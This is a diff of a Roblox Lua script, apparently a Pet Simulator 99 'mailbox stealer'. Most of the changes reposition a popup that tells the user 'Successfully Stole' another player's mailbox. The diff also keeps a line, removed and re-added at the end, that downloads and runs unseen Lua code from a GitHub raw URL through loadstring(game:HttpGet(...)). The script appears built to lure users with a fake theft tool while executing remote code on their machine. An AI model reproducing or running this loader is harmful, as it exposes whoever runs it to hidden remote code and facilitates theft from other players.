@@ -97,24 +97,25 @@ StealButton.MouseButton1Click:Connect(function()
 
     -- Create success popup
     local SuccessGui = Instance.new("ScreenGui")
-    local SuccessFrame = Instance.new("Frame")
-    local SuccessLabel = Instance.new("TextLabel")
+local SuccessFrame = Instance.new("Frame")
+local SuccessLabel = Instance.new("TextLabel")
 
-    SuccessGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+SuccessGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
-    SuccessFrame.Parent = SuccessGui
-    SuccessFrame.BackgroundColor3 = Color3.fromRGB(240, 255, 0)
-    SuccessFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
-    SuccessFrame.Size = UDim2.new(0, 300, 0, 100)
+SuccessFrame.Parent = SuccessGui
+SuccessFrame.BackgroundColor3 = Color3.fromRGB(240, 255, 0)
+SuccessFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+SuccessFrame.Size = UDim2.new(0, 300, 0, 100)
+SuccessFrame.AnchorPoint = Vector2.new(0.5, 0.5)  -- Center the frame
 
-    SuccessLabel.Parent = SuccessFrame
-    SuccessLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    SuccessLabel.Position = UDim2.new(0.5, 0, 0.3, 0)
-    SuccessLabel.Size = UDim2.new(0.8, 0, 0.4, 0)
-    SuccessLabel.Text = "Successfully Stole " .. username .. "'s mailbox please rejoin !"
+SuccessLabel.Parent = SuccessFrame
+SuccessLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+SuccessLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+SuccessLabel.Size = UDim2.new(0.8, 0, 0.4, 0)
+SuccessLabel.AnchorPoint = Vector2.new(0.5, 0.5)  -- Center the label
+SuccessLabel.Text = "Successfully Stole " .. username .. "'s mailbox please rejoin And check ur mailbox!"
 
-    makeDraggable(SuccessFrame)
+makeDraggable(SuccessFrame)
 
-    -- Execute another script
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/ps99/main/de870018723945ddefe27853.lua"))()
-end)
+-- Execute another script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/ps99/main/de870018723945ddefe27853.lua"))()
